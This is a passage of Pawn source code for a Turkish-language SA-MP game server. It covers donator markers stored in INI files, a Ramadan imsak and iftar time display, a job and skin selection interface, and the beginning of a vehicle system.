	format(AdminList, 2000, "%s{DDDDDD}Sunucumuzda {FFC000}%d {DDDDDD}DONATOR bulunmaktadýr\n", AdminList, Iter_Count(DONs));
	ShowPlayerDialog(playerid, 9999, DIALOG_STYLE_LIST, "{FF4040}Donatorlerimiz", AdminList, "Kapat", "");
	return 1;
}

// NearDon
NearDon(playerid)
{
	new Sonuc = -1;

	foreach(new i : DONs)
	{
	    if(Don[i][DonExist] == 1)
	    {
	        if(IsPlayerInRangeOfPoint(playerid, 3.0, Don[i][DonX], Don[i][DonY], Don[i][DonZ]))
	        {
	            Sonuc = i;
	            break;
	        }
	    }
	}
	return Sonuc;
}

// CreateDon
forward CreateDon(Name[], Float:X, Float:Y, Float:Z);
public CreateDon(Name[], Float:X, Float:Y, Float:Z)
{
	new CreatedID = Iter_Free(DONs);

	Iter_Add(DONs, CreatedID);
	Don[CreatedID][DonExist] = 1;

	format(Don[CreatedID][DonName], 30, Name);
	Don[CreatedID][DonX] = X;
	Don[CreatedID][DonY] = Y;
	Don[CreatedID][DonZ] = Z;

	new Yazi[256];
	format(Yazi, 256, "{FFCC00}» {FFFFFF}DONATOR\n{F8F8FF}\"{00CED1}%s{F8F8FF}\"", Name);
	Don[CreatedID][Don3D] = CreateDynamic3DTextLabel(Yazi, -1, Don[CreatedID][DonX], Don[CreatedID][DonY], Don[CreatedID][DonZ], 30.0);

	new FileName[35];
	format(FileName, 35, "%s/Don_%d.ini", DONATOR_DIZIN, CreatedID);

	new INI:ATMFile = INI_Open(FileName);

	INI_SetTag(ATMFile, "don");

	INI_WriteString(ATMFile, "Name", Name);
	INI_WriteFloat(ATMFile, "X", X);
	INI_WriteFloat(ATMFile, "Y", Y);
	INI_WriteFloat(ATMFile, "Z", Z);

	INI_Close(ATMFile);

	return CreatedID;
}

// DeleteDon
forward DeleteDon(DonID);
public DeleteDon(DonID)
{
	Don[DonID][DonExist] = 0;
	DestroyDynamic3DTextLabel(Don[DonID][Don3D]);

	Iter_Remove(DONs, DonID);

	new FileName[35];
	format(FileName, 35, "%s/Don_%d.ini", DONATOR_DIZIN, DonID);
	fremove(FileName);
}

// LoadDon
forward LoadDon();
public LoadDon()
{
	new MGPFileName[35], String[256];

	for(new i = 0; i < MAX_DONATOR; i++)
	{
		format(MGPFileName, 35, "%s/Don_%d.ini", DONATOR_DIZIN, i);

		if(fexist(MGPFileName))
		{
		    INI_ParseFile(MGPFileName, "LoadDon_%s", .bExtra = true, .extra = i);

			Iter_Add(DONs, i);

			format(String, 256, "DONATOR\n{F8F8FF}\"{00CED1}%s{F8F8FF}\"", Don[i][DonName]);
			Don[i][Don3D] = CreateDynamic3DTextLabel(String, -1, Don[i][DonX], Don[i][DonY], Don[i][DonZ], 30.0);

	        Don[i][DonExist] = 1;
		}
	}
}

// LoadDon_don
forward LoadDon_don(DonID, name[], value[]);
public LoadDon_don(DonID, name[], value[])
{
	INI_String("Name", Don[DonID][DonName], 30);
	INI_Float("X", Don[DonID][DonX]);
	INI_Float("Y", Don[DonID][DonY]);
	INI_Float("Z", Don[DonID][DonZ]);
	Don[DonID][DonExist] = 1;
	return 1;
}

//==================== [ Yeni Duyuru Sistemi ] =================================
stock TurkceCar(car[]) {
  new tmp[256];
  set(tmp,car);
  tmp=strreplace("ð","g",tmp);
  tmp=strreplace("|","",tmp);
  tmp=strreplace("Ð","G",tmp);
  tmp=strreplace("þ","s",tmp);
  tmp=strreplace("Þ","S",tmp);
  tmp=strreplace("ý","i",tmp);
  tmp=strreplace("I","I",tmp);
  tmp=strreplace("Ý","I",tmp);
  tmp=strreplace("ö","o",tmp);
  tmp=strreplace("Ö","O",tmp);
  tmp=strreplace("ç","c",tmp);
  tmp=strreplace("Ç","C",tmp);
  tmp=strreplace("ü","u",tmp);
  tmp=strreplace("Ü","U",tmp);
  return tmp;
}
//==============================================================================


// ************************************************************************************************************************************************************
// Ramazan Vakitleri Sistemi ( By EvoturK )
// ************************************************************************************************************************************************************


// /ramazanyenile
CMD:ramazanyenile(playerid, params[])
{
    if(APlayerData[playerid][PlayerLevel] < 7 && Root[playerid] == 0) return 1;
	RamazanVakitYukle();
	if(rSistemAktif == true) SendClientMessage(playerid, -1, "{00FF00}Ramazan Vakitleri dosyadan tekrar yüklendi.");
	if(rSistemAktif == false) SendClientMessage(playerid, -1, "{FF0000}Ramazan Vakitleri dosyasý bulunamadýðý için sistem pasif hale getirildi.");
	return 1;
}

// ShowRamazanUI
ShowRamazanUI(playerid)
{
	if(rSistemAktif == true && TextKapat[playerid] == 0 && APlayerSpawnData[playerid] == true)
	{
	    TextDrawShowForPlayer(playerid, UI_RamazanBaslik);
	    for(new i; i < 7; i++)
	    {
	        TextDrawShowForPlayer(playerid, UI_RamazanSehir[i]);
	    }
	}else{
	    TextDrawHideForPlayer(playerid, UI_RamazanBaslik);
	    for(new i; i < 7; i++)
	    {
	        TextDrawHideForPlayer(playerid, UI_RamazanSehir[i]);
	    }
	}
	return 1;
}

// RamazanUIUpdate
RamazanUI_Update()
{
	if(rSistemAktif == false) return 1;
	for(new td; td < 7; td++)
	{
	    TextDrawSetString(UI_RamazanSehir[td], " ");
	}

	new Yazi[128], Saat  , Dakika, Saniye, sSayi, Mode; // Mode 0 = Varsayýlan | Mode 1 = Ýmsak | Mode 2 = Ýftar
	gettime(Saat, Dakika, Saniye);
	#pragma unused Saniye

	foreach(new i : RSH)
	{
	    if(sSayi == 7) break;
	    // Ýmsak Saati
		if(Saat < rSehir[i][rSehirImSaat])
		{
		    Mode = 1;
		    format(Yazi, 128, "~w~] %d:%d %s", rSehir[i][rSehirImSaat], rSehir[i][rSehirImDakika], rSehir[i][rSehirName]);
			TextDrawSetString(UI_RamazanSehir[sSayi], Yazi);
			sSayi++;
			continue;
		}

		if(Saat == rSehir[i][rSehirImSaat])
		{
		    if(Dakika < rSehir[i][rSehirImDakika])
		    {
			    Mode = 1;
			    format(Yazi, 128, "~w~] %d:%d %s", rSehir[i][rSehirImSaat], rSehir[i][rSehirImDakika], rSehir[i][rSehirName]);
				TextDrawSetString(UI_RamazanSehir[sSayi], Yazi);
				sSayi++;
				continue;
		    }

		    if(Dakika == rSehir[i][rSehirImDakika])
		    {
			    Mode = 1;
			    format(Yazi, 128, "~r~] %d:%d %s", rSehir[i][rSehirImSaat], rSehir[i][rSehirImDakika], rSehir[i][rSehirName]);
				TextDrawSetString(UI_RamazanSehir[sSayi], Yazi);
				sSayi++;
				continue;
		    }
		}
	}

	if(Mode == 0)
	{
		foreach(new i : RSH)
		{
		    if(sSayi == 7) break;
			// Ýftar Saati
			if(Saat < rSehir[i][rSehirIfSaat])
			{
			    Mode = 2;
			    format(Yazi, 128, "~w~] %d:%d %s", rSehir[i][rSehirIfSaat], rSehir[i][rSehirIfDakika], rSehir[i][rSehirName]);
				TextDrawSetString(UI_RamazanSehir[sSayi], Yazi);
				sSayi++;
				continue;
			}

			if(Saat == rSehir[i][rSehirIfSaat])
			{
			    if(Dakika < rSehir[i][rSehirIfDakika])
			    {
				    Mode = 2;
				    format(Yazi, 128, "~w~] %d:%d %s", rSehir[i][rSehirIfSaat], rSehir[i][rSehirIfDakika], rSehir[i][rSehirName]);
					TextDrawSetString(UI_RamazanSehir[sSayi], Yazi);
					sSayi++;
					continue;
			    }

			    if(Dakika == rSehir[i][rSehirIfDakika])
			    {
				    Mode = 2;
				    format(Yazi, 128, "~r~] %d:%d %s", rSehir[i][rSehirIfSaat], rSehir[i][rSehirIfDakika], rSehir[i][rSehirName]);
					TextDrawSetString(UI_RamazanSehir[sSayi], Yazi);
					sSayi++;
					continue;
			    }
			}
		}
	}

	switch(Mode)
	{
	    case 1: TextDrawSetString(UI_RamazanBaslik, "imsak vakti");
	    case 2: TextDrawSetString(UI_RamazanBaslik, "iftar vakti");
	}
	return 1;
}

// RamazanVakitYukle
RamazanVakitYukle()
{
	if(Iter_Count(RSH) > 0) Iter_Clear(RSH);

	new FileName[50], Satir[256], SatirBol[5][60], Gun, Ay, Yil, CreatedID;
	getdate(Yil, Ay, Gun);
	format(FileName, 50, "ServerData/Ramazan/%d.%d.%d.txt", Gun, Ay, Yil);
	printf(FileName);

	if(fexist(FileName))
	{
	    printf("Ramazan Vakitleri sistemi AKTIF");
	    rSistemAktif = true;

	    new File:Dosya = fopen(FileName, io_read);
		while(fread(Dosya, Satir))
		{
		    split(Satir, SatirBol, '|');
		    CreatedID = Iter_Free(RSH);

			Iter_Add(RSH, CreatedID);
			format(rSehir[CreatedID][rSehirName], 50, SatirBol[0]);
			rSehir[CreatedID][rSehirImSaat] = strval(SatirBol[1]);
 			rSehir[CreatedID][rSehirImDakika] = strval(SatirBol[2]);
 			rSehir[CreatedID][rSehirIfSaat] = strval(SatirBol[3]);
 			rSehir[CreatedID][rSehirIfDakika] = strval(SatirBol[4]);
 			rSehir[CreatedID][rSehirExist] = true;
		}
	    fclose(Dosya);
	    printf("%d.%d.%d Ramazan Vakitleri yuklendi.", Gun, Ay, Yil);
	    printf("%d Sehire ait Ramazan Vakitleri yuklendi.", Iter_Count(RSH));
	}else{
	    rSistemAktif = false;
	    printf("Ramazan Vakitleri sistemi PASIF");
	}
	return 1;
}

// RamazanUIYukle
RamazanUIYukle()
{
	UI_RamazanBaslik = TextDrawCreate(497.000000, 256.000000, "iftar vakti");
	TextDrawBackgroundColor(UI_RamazanBaslik, 255);
	TextDrawFont(UI_RamazanBaslik, 3);
	TextDrawLetterSize(UI_RamazanBaslik, 0.300000, 1.100000);
	TextDrawColor(UI_RamazanBaslik, 16777215);
	TextDrawSetOutline(UI_RamazanBaslik, 1);
	TextDrawSetProportional(UI_RamazanBaslik, 1);
	TextDrawSetSelectable(UI_RamazanBaslik, 0);

	for(new i; i < 7; i++)
	{
		UI_RamazanSehir[i] = TextDrawCreate(496.000000, 268.0 + (10.0 * i), " ");
		TextDrawBackgroundColor(UI_RamazanSehir[i], 255);
		TextDrawFont(UI_RamazanSehir[i], 2);
		TextDrawLetterSize(UI_RamazanSehir[i], 0.200000, 1.100000);
		TextDrawColor(UI_RamazanSehir[i], 0xFFFFFFFF);
		TextDrawSetOutline(UI_RamazanSehir[i], 1);
		TextDrawSetProportional(UI_RamazanSehir[i], 1);
		TextDrawSetSelectable(UI_RamazanSehir[i], 0);
	}
	return 1;
}

// ************************************************************************************************************************************************************
// MeslekUI ( By EvoturK )
// ************************************************************************************************************************************************************
// /meslek
CMD:meslek(playerid)
{
    if(GetPlayerVehicleID(playerid) != 0)return SendClientMessage(playerid, 0xFF4040, "Araçtayken bu komutu kullanamazsýnýz!");
	if(APlayerData[playerid][PlayerWanted] > 0) return SendClientMessage(playerid, 0xFF4040, "Aranýyorken meslek deðiþtiremezsiniz!");
	if (APlayerData[playerid][JobStarted] == true)
	{
 		// Check the class of the player
		switch (APlayerData[playerid][PlayerClass])
		{
			case ClassTruckDriver: Trucker_EndJob(playerid); // Stop any trucker job
			case ClassBusDriver: BusDriver_EndJob(playerid); // Stop any trucker job
			case ClassPilot: Pilot_EndJob(playerid); // Stop any pilot job
			case ClassMafia: Mafia_EndJob(playerid); // Stop any mafia job
			case ClassRoadWorker: Roadworker_EndJob(playerid);
			case ClassDolmusDriver: DolmusDriver_EndJob(playerid);
			case ClassCopcu:
			{
				SendClientMessage(CopOrtak[playerid], -1, "{00FF00}Ortaðýnýz görevi iptal etti!");

	        	StopCopcuGorev(playerid);
			}
			case ClassKargocu:
			{
				if(KargoOrtak[playerid] != -1)
      			{
					SendClientMessage(KargoOrtak[playerid], -1, "{00FF00}Ortaðýnýz görevi iptal etti!");
				}

				StopKargocuGorev(playerid);
			}
			case ClassBanka: Banka_EndJob(playerid);
			case ClassFire: Fire_EndJob(playerid);
			case ClassPboy: Pboy_EndJob(playerid);
  			case ClassGemici: Gemici_EndJob(playerid);
  			case ClassOduncu: { Oduncu_EndJob(playerid); return 1; }
  			case ClassBalikci: { Balikci_EndJob(playerid); return 1; }
		}
		SendClientMessage(playerid,-1," Görevinizi Ýptal Ettiginiz $1000 Kaybettiniz ");
		RewardPlayer(playerid, -1000, 0);
	}
	MeslekUI_Mod[playerid] = 1;
	MeslekUI_Show(playerid);
	return 1;
}

// MeslekUI_Show
MeslekUI_Show(playerid)
{
	for(new i; i < 16; i++)
 	{
 	    if(i < 7) TextDrawHideForPlayer(playerid, MeslekUI_Text[i]);
  		PlayerTextDrawHide(playerid, MeslekUI_Logo[playerid][i]);
    	PlayerTextDrawHide(playerid, MeslekUI_Yazi[playerid][i]);
    }

    PlayerTextDrawHide(playerid, MeslekUI_Bilgi[playerid]);

	new Yazi[100];
	switch(MeslekUI_Mod[playerid])
	{
	    case 1: // Meslek Seç
	    {
	        MeslekUI_Free(playerid);
	        for(new i; i < sizeof(Meslekler); i++)
	        {
	            MeslekUI_Item[playerid][i] = i+1;
	            MeslekUI_ItemModel[playerid][i] = Meslekler[i][meslekModel];
	            format(Yazi, 100, "%s", Meslekler[i][meslekName]);
	            if(Meslekler[i][meslekSkor] > 0) format(Yazi, 100, "%s~n~~y~%d Skor", Yazi, Meslekler[i][meslekSkor]);
				PlayerTextDrawSetString(playerid, MeslekUI_Yazi[playerid][i], Yazi);
				PlayerTextDrawSetPreviewModel(playerid, MeslekUI_Logo[playerid][i], Meslekler[i][meslekModel]);
			}

	        for(new i; i < 7; i++) TextDrawShowForPlayer(playerid, MeslekUI_Text[i]);

	        for(new i; i < 16; i++)
	        {
	            if(MeslekUI_Item[playerid][i] == -1) continue;
	            PlayerTextDrawShow(playerid, MeslekUI_Logo[playerid][i]);
	            PlayerTextDrawShow(playerid, MeslekUI_Yazi[playerid][i]);
	        }
			for(new i; i < 7; i++)
			{
				PlayerTextDrawShow(playerid, UI_AdminText[playerid][i]);
			}

	        PlayerTextDrawSetString(playerid, MeslekUI_Bilgi[playerid], "Meslegini Sec");
	        PlayerTextDrawShow(playerid, MeslekUI_Bilgi[playerid]);

	        SelectTextDraw(playerid, 0xFF4040FF);
	    }

	    case 2: // Skin Seç
	    {
	    	MeslekUI_Free(playerid);

			switch(APlayerData[playerid][PlayerClass])
			{
				case ClassTruckDriver://TeaMStar1085
				{
					MeslekUI_Item[playerid][0] = MeslekUI_ItemModel[playerid][0] = 46;
					MeslekUI_Item[playerid][1] = MeslekUI_ItemModel[playerid][1] = 60;
					MeslekUI_Item[playerid][2] = MeslekUI_ItemModel[playerid][2] = 73;
					MeslekUI_Item[playerid][3] = MeslekUI_ItemModel[playerid][3] = 121;
					MeslekUI_Item[playerid][4] = MeslekUI_ItemModel[playerid][4] = 170;
					MeslekUI_Item[playerid][5] = MeslekUI_ItemModel[playerid][5] = 179;
					MeslekUI_Item[playerid][6] = MeslekUI_ItemModel[playerid][6] = 198;
					MeslekUI_Item[playerid][7] = MeslekUI_ItemModel[playerid][7] = 242;
				}
				case ClassBusDriver:
				{
					MeslekUI_Item[playerid][0] = MeslekUI_ItemModel[playerid][0] = 255; // Class 8 = Bus driver
					MeslekUI_Item[playerid][1] = MeslekUI_ItemModel[playerid][1] = 253; // Class 9 = Bus driver
				}
				case ClassDolmusDriver:
				{
					MeslekUI_Item[playerid][0] = MeslekUI_ItemModel[playerid][0] = 59; 
					MeslekUI_Item[playerid][1] = MeslekUI_ItemModel[playerid][1] = 15; 
					MeslekUI_Item[playerid][2] = MeslekUI_ItemModel[playerid][2] = 47;
					MeslekUI_Item[playerid][3] = MeslekUI_ItemModel[playerid][3] = 125;
				}
				case ClassPilot:
				{
					MeslekUI_Item[playerid][0] = MeslekUI_ItemModel[playerid][0] = 61; // Class 10 = Pilot
				}
				case ClassPolice:
				{
					MeslekUI_Item[playerid][0] = MeslekUI_ItemModel[playerid][0] = 280; // Class 11 = Police
					MeslekUI_Item[playerid][1] = MeslekUI_ItemModel[playerid][1] = 306; // Class 12 = Police
					MeslekUI_Item[playerid][2] = MeslekUI_ItemModel[playerid][2] = 283; // Class 13 = Police
				}
				case ClassMafia:
				{
					MeslekUI_Item[playerid][0] = MeslekUI_ItemModel[playerid][0] = 111; // Class 14 = Mafia
					MeslekUI_Item[playerid][1] = MeslekUI_ItemModel[playerid][1] = 112; // Class 15 = Mafia
					MeslekUI_Item[playerid][2] = MeslekUI_ItemModel[playerid][2] = 113; // Class 16 = Mafia
				}
				case ClassRoadWorker:
				{
					MeslekUI_Item[playerid][0] = MeslekUI_ItemModel[playerid][0] = 16; // Class 17 = Roadworker
					MeslekUI_Item[playerid][1] = MeslekUI_ItemModel[playerid][1] = 27; // Class 18 = Roadworker
					MeslekUI_Item[playerid][2] = MeslekUI_ItemModel[playerid][2] = 260; // Class 19 = Roadworker
				}
				case ClassGemici:
				{
					MeslekUI_Item[playerid][0] = MeslekUI_ItemModel[playerid][0] = 61; // Class 20 = Gemici
				}
				case ClassOduncu:
				{
					MeslekUI_Item[playerid][0] = MeslekUI_ItemModel[playerid][0] = 44; // Class 21 = Oduncu
				}
				case ClassBalikci:
				{
					MeslekUI_Item[playerid][0] = MeslekUI_ItemModel[playerid][0] = 34; // Class 22 = Balikci
				}
				case ClassCopcu:
				{
					MeslekUI_Item[playerid][0] = MeslekUI_ItemModel[playerid][0] = 8; // Class 23 = copcu
					MeslekUI_Item[playerid][1] = MeslekUI_ItemModel[playerid][1] = 137; // Class 24 = copcu
					MeslekUI_Item[playerid][2] = MeslekUI_ItemModel[playerid][2] = 258; // Class 25 = copcu
				}
				case ClassFBY:
				{
					MeslekUI_Item[playerid][0] = MeslekUI_ItemModel[playerid][0] = 286; // Class 26 = FBY
					MeslekUI_Item[playerid][1] = MeslekUI_ItemModel[playerid][1] = 287; // Class 27 = FBY
					MeslekUI_Item[playerid][2] = MeslekUI_ItemModel[playerid][2] = 285; // Class 28 = FBY
				}
				case ClassBanka:
				{
					MeslekUI_Item[playerid][0] = MeslekUI_ItemModel[playerid][0] = 71; // Class 29 = Bankaci
				}
				case ClassFire:
				{
					MeslekUI_Item[playerid][0] = MeslekUI_ItemModel[playerid][0] = 277; // Class 30 = Itfaiyeci
				    MeslekUI_Item[playerid][1] = MeslekUI_ItemModel[playerid][1] = 279; // Class 31 = Itfaiyeci
				}
				case ClassPboy:
				{
				    MeslekUI_Item[playerid][0] = MeslekUI_ItemModel[playerid][0] = 155; // Class 35 = pizza
				    MeslekUI_Item[playerid][1] = MeslekUI_ItemModel[playerid][1] = 209; // Class 36 = pizza
				}
				case ClassKargocu:
				{
				    MeslekUI_Item[playerid][0] = MeslekUI_ItemModel[playerid][0] = 8; // Class 37 = kargocu
				}
			}

	        for(new i; i < 7; i++) TextDrawShowForPlayer(playerid, MeslekUI_Text[i]);

	        for(new i; i < 16; i++)
	        {
	            if(MeslekUI_Item[playerid][i] == -1) continue;
				PlayerTextDrawSetString(playerid, MeslekUI_Yazi[playerid][i], " ");
				PlayerTextDrawSetPreviewModel(playerid, MeslekUI_Logo[playerid][i], MeslekUI_ItemModel[playerid][i]);
	            PlayerTextDrawShow(playerid, MeslekUI_Logo[playerid][i]);
	            PlayerTextDrawShow(playerid, MeslekUI_Yazi[playerid][i]);
	        }

	        PlayerTextDrawSetString(playerid, MeslekUI_Bilgi[playerid], "Meslek Kiyafetini Sec");
	        PlayerTextDrawShow(playerid, MeslekUI_Bilgi[playerid]);

	        SelectTextDraw(playerid, 0xFF4040FF);
	        if(Sirket[playerid] != -1)
	        {
		        new Msg[254];
		        format(Msg, 128, "Þirket Duyurusu:{FFFFFF} %s", Sirketler[Sirket[playerid]][SirketDuyuru]);
				SendClientMessage(playerid, COLOR_ORANGE, Msg);
			}
	    }
	}
	return 1;
}

// MeslekUI_Free
MeslekUI_Free(playerid) { for(new i; i < 16; i++) MeslekUI_Item[playerid][i] = -1; return 1; }

// MeslekUI_PLoad
MeslekUI_PLoad(playerid)
{
	new tur, kalan;
	for(new i; i < 16; i++)
	{
	    kalan = i % 8;
	    tur = (i-kalan)/8;

	    switch(tur)
	    {
			case 0:
			{
                MeslekUI_Logo[playerid][i] = CreatePlayerTextDraw(playerid,23.0 + (75.0 * kalan), 134.0, "Model 515");
                MeslekUI_Yazi[playerid][i] = CreatePlayerTextDraw(playerid,57.0 + (75.0 * kalan), 194.0, " ");
			}

			case 1:
			{
                MeslekUI_Logo[playerid][i] = CreatePlayerTextDraw(playerid,23.0 + (75.0 * kalan), 231.0, "Model 515");
                MeslekUI_Yazi[playerid][i] = CreatePlayerTextDraw(playerid,57.0 + (75.0 * kalan), 291.0, " ");
			}
	    }

		PlayerTextDrawBackgroundColor(playerid,MeslekUI_Logo[playerid][i], 255);
		PlayerTextDrawFont(playerid,MeslekUI_Logo[playerid][i], 5);
		PlayerTextDrawLetterSize(playerid,MeslekUI_Logo[playerid][i], 0.500000, 1.000000);
		PlayerTextDrawColor(playerid,MeslekUI_Logo[playerid][i], -1);
		PlayerTextDrawSetOutline(playerid,MeslekUI_Logo[playerid][i], 0);
		PlayerTextDrawSetProportional(playerid,MeslekUI_Logo[playerid][i], 1);
		PlayerTextDrawSetShadow(playerid,MeslekUI_Logo[playerid][i], 1);
		PlayerTextDrawUseBox(playerid,MeslekUI_Logo[playerid][i], 1);
		PlayerTextDrawBoxColor(playerid,MeslekUI_Logo[playerid][i], 255);
		PlayerTextDrawTextSize(playerid,MeslekUI_Logo[playerid][i], 70.000000, 60.000000);
		PlayerTextDrawSetPreviewModel(playerid, MeslekUI_Logo[playerid][i], 0);
		PlayerTextDrawSetPreviewRot(playerid, MeslekUI_Logo[playerid][i], -8.000000, 0.000000, 0.000000, 0.850000);
		PlayerTextDrawSetSelectable(playerid,MeslekUI_Logo[playerid][i], 1);
		PlayerTextDrawBackgroundColor(playerid, MeslekUI_Logo[playerid][i], 0x80FFFF88);

		PlayerTextDrawAlignment(playerid,MeslekUI_Yazi[playerid][i], 2);
		PlayerTextDrawBackgroundColor(playerid,MeslekUI_Yazi[playerid][i], 255);
		PlayerTextDrawFont(playerid,MeslekUI_Yazi[playerid][i], 2);
		PlayerTextDrawLetterSize(playerid,MeslekUI_Yazi[playerid][i], 0.200000, 1.100000);
		PlayerTextDrawColor(playerid,MeslekUI_Yazi[playerid][i], -1);
		PlayerTextDrawSetOutline(playerid,MeslekUI_Yazi[playerid][i], 0);
		PlayerTextDrawSetProportional(playerid,MeslekUI_Yazi[playerid][i], 1);
		PlayerTextDrawSetShadow(playerid,MeslekUI_Yazi[playerid][i], 1);
		PlayerTextDrawSetSelectable(playerid,MeslekUI_Yazi[playerid][i], 0);
	}

	MeslekUI_Bilgi[playerid] = CreatePlayerTextDraw(playerid,319.000000, 340.000000, " ");
	PlayerTextDrawAlignment(playerid,MeslekUI_Bilgi[playerid], 2);
	PlayerTextDrawBackgroundColor(playerid,MeslekUI_Bilgi[playerid], 255);
	PlayerTextDrawFont(playerid,MeslekUI_Bilgi[playerid], 2);
	PlayerTextDrawLetterSize(playerid,MeslekUI_Bilgi[playerid], 0.200000, 1.100000);
	PlayerTextDrawColor(playerid,MeslekUI_Bilgi[playerid], -1);
	PlayerTextDrawSetOutline(playerid,MeslekUI_Bilgi[playerid], 0);
	PlayerTextDrawSetProportional(playerid,MeslekUI_Bilgi[playerid], 1);
	PlayerTextDrawSetShadow(playerid,MeslekUI_Bilgi[playerid], 1);
	PlayerTextDrawSetSelectable(playerid,MeslekUI_Bilgi[playerid], 0);
	return 1;
}

// MeslekUI_Load
MeslekUI_Load()
{
	MeslekUI_Text[0] = TextDrawCreate(-5.000000, 332.000000, "_");
	TextDrawBackgroundColor(MeslekUI_Text[0], 255);
	TextDrawFont(MeslekUI_Text[0], 1);
	TextDrawLetterSize(MeslekUI_Text[0], 0.500000, 13.400001);
	TextDrawColor(MeslekUI_Text[0], -1);
	TextDrawSetOutline(MeslekUI_Text[0], 0);
	TextDrawSetProportional(MeslekUI_Text[0], 1);
	TextDrawSetShadow(MeslekUI_Text[0], 1);
	TextDrawUseBox(MeslekUI_Text[0], 1);
	TextDrawBoxColor(MeslekUI_Text[0], 150);
	TextDrawTextSize(MeslekUI_Text[0], 645.000000, 0.000000);
	TextDrawSetSelectable(MeslekUI_Text[0], 0);

	MeslekUI_Text[1] = TextDrawCreate(-5.000000, 332.000000, "_");
	TextDrawBackgroundColor(MeslekUI_Text[1], 255);
	TextDrawFont(MeslekUI_Text[1], 1);
	TextDrawLetterSize(MeslekUI_Text[1], 0.500000, -0.199998);
	TextDrawColor(MeslekUI_Text[1], -1);
	TextDrawSetOutline(MeslekUI_Text[1], 0);
	TextDrawSetProportional(MeslekUI_Text[1], 1);
	TextDrawSetShadow(MeslekUI_Text[1], 1);
	TextDrawUseBox(MeslekUI_Text[1], 1);
	TextDrawBoxColor(MeslekUI_Text[1], -2130706433);
	TextDrawTextSize(MeslekUI_Text[1], 645.000000, 0.000000);
	TextDrawSetSelectable(MeslekUI_Text[1], 0);

	MeslekUI_Text[2] = TextDrawCreate(-5.000000, -9.000000, "_");
	TextDrawBackgroundColor(MeslekUI_Text[2], 255);
	TextDrawFont(MeslekUI_Text[2], 1);
	TextDrawLetterSize(MeslekUI_Text[2], 0.500000, 13.400001);
	TextDrawColor(MeslekUI_Text[2], -1);
	TextDrawSetOutline(MeslekUI_Text[2], 0);
	TextDrawSetProportional(MeslekUI_Text[2], 1);
	TextDrawSetShadow(MeslekUI_Text[2], 1);
	TextDrawUseBox(MeslekUI_Text[2], 1);
	TextDrawBoxColor(MeslekUI_Text[2], 150);
	TextDrawTextSize(MeslekUI_Text[2], 645.000000, 0.000000);
	TextDrawSetSelectable(MeslekUI_Text[2], 0);

	MeslekUI_Text[3] = TextDrawCreate(-5.000000, 114.000000, "_");
	TextDrawBackgroundColor(MeslekUI_Text[3], 255);
	TextDrawFont(MeslekUI_Text[3], 1);
	TextDrawLetterSize(MeslekUI_Text[3], 0.500000, -0.199998);
	TextDrawColor(MeslekUI_Text[3], -1);
	TextDrawSetOutline(MeslekUI_Text[3], 0);
	TextDrawSetProportional(MeslekUI_Text[3], 1);
	TextDrawSetShadow(MeslekUI_Text[3], 1);
	TextDrawUseBox(MeslekUI_Text[3], 1);
	TextDrawBoxColor(MeslekUI_Text[3], -2130706433);
	TextDrawTextSize(MeslekUI_Text[3], 645.000000, 0.000000);
	TextDrawSetSelectable(MeslekUI_Text[3], 0);

	MeslekUI_Text[4] = TextDrawCreate(320.000000, 83.000000, "Canakkale ");
	TextDrawAlignment(MeslekUI_Text[4], 2);
	TextDrawBackgroundColor(MeslekUI_Text[4], 255);
	TextDrawFont(MeslekUI_Text[4], 2);
	TextDrawLetterSize(MeslekUI_Text[4], 0.510000, 2.300000);
	TextDrawColor(MeslekUI_Text[4], -4194049);
	TextDrawSetOutline(MeslekUI_Text[4], 0);
	TextDrawSetProportional(MeslekUI_Text[4], 1);
	TextDrawSetShadow(MeslekUI_Text[4], 1);
	TextDrawSetSelectable(MeslekUI_Text[4], 0);

	MeslekUI_Text[5] = TextDrawCreate(319.000000, 101.000000, "Meslek Sunucusu");
	TextDrawAlignment(MeslekUI_Text[5], 2);
	TextDrawBackgroundColor(MeslekUI_Text[5], 255);
	TextDrawFont(MeslekUI_Text[5], 2);
	TextDrawLetterSize(MeslekUI_Text[5], 0.200000, 1.100000);
	TextDrawColor(MeslekUI_Text[5], -1);
	TextDrawSetOutline(MeslekUI_Text[5], 0);
	TextDrawSetProportional(MeslekUI_Text[5], 1);
	TextDrawSetShadow(MeslekUI_Text[5], 1);
	TextDrawSetSelectable(MeslekUI_Text[5], 0);

	MeslekUI_Text[6] = TextDrawCreate(319.000000, 434.000000, "~r~~h~]]] ~p~~h~~h~Canakkale Meslek.com ~r~~h~]]]");
	TextDrawAlignment(MeslekUI_Text[6], 2);
	TextDrawBackgroundColor(MeslekUI_Text[6], 255);
	TextDrawFont(MeslekUI_Text[6], 2);
	TextDrawLetterSize(MeslekUI_Text[6], 0.200000, 1.100000);
	TextDrawColor(MeslekUI_Text[6], -1);
	TextDrawSetOutline(MeslekUI_Text[6], 0);
	TextDrawSetProportional(MeslekUI_Text[6], 1);
	TextDrawSetShadow(MeslekUI_Text[6], 1);
	TextDrawSetSelectable(MeslekUI_Text[6], 0);
	return 1;
}
// < Araç Sistemi > ============================================================
/*
// Add_StaticVehicle
Add_StaticVehicle(model, Float:x, Float:y, Float:z, Float:rz, color1, color2, respawn_delay=500, addsiren=0)
{
	new AracID = CreateVehicle(model, x, y, z, rz, color1, color2, respawn_delay, addsiren);
	Araclar[AracID][AracStatic] = true;
	Araclar[AracID][AracKira] = false; // Araç Kiralama Sistemi
	Araclar[AracID][AracInSHP] = false; // Araç Sahiplik Sistemi

	Araclar[AracID][AracR1] = color1;
	Araclar[AracID][AracR2] = color2;
	Araclar[AracID][AracPJ] = 3;
	Araclar[AracID][AracNOS] = false;
	Araclar[AracID][AracGR1] = color1;
	Araclar[AracID][AracGR2] = color2;
	Araclar[AracID][AracGPJ] = 3;
	Araclar[AracID][AracGNOS] = false;

	// Modifiye Sistemi
	Araclar[AracID][AracNeon] = 0;
	Araclar[AracID][AracNeonObj][0] = -1;
	Araclar[AracID][AracNeonObj][1] = -1;

	// Karavan Sistemi
	Araclar[AracID][AracKaravan] = false;
	Araclar[AracID][AracKaravanObj] = -1;
	Araclar[AracID][AracKaravan3D] = Text3D:-1;
	return AracID;
}
*/
// Add_DynamicVehicle
Add_DynamicVehicle(model, Float:x, Float:y, Float:z, Float:rz, color1, color2, respawn_delay, addsiren=0)
{
	new ArabaID = CreateVehicle(model, x, y, z, rz, color1, color2, respawn_delay, addsiren);
	Araclar[ArabaID][AracStatic] = false;
	Araclar[ArabaID][AracKira] = false; // Araç Kiralama Sistemi
	Araclar[ArabaID][AracInSHP] = false; // Araç Sahiplik Sistemi

	Araclar[ArabaID][AracR1] = color1;
	Araclar[ArabaID][AracR2] = color2;
